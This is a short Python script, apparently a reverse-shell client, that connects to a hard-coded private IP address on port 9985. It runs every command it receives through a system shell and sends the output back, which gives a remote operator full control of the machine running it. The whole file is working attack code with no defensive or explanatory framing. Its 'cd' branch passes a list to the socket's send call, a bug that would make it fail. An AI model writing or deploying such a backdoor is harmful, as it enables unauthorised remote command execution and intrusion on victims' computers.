import os
import socket
import subprocess

s = socket.socket()
#host = "192.168.1.124"
host = "192.168.61.133"
port = 9985
s.connect((host, port))

while True:

    data = s.recv(1024)
    rawcmd = data[:].decode("utf-8")
    if data[:2].decode("utf-8") == 'cd':
        if len(data) <= 3:
            os.chdir('C:////')
        else:
            os.chdir(data[3:].decode("utf-8"))
        # Send dir info
        dirInfo = os.listdir()
        dirInfo = [x.encode('utf-8') for x in dirInfo]
        s.send([dirInfo ,str.encode(str(os.getcwd()) + ">!!> ")])
    elif len(data) > 0:
        cmd = subprocess.Popen(rawcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + ">!!> "))

s.close()
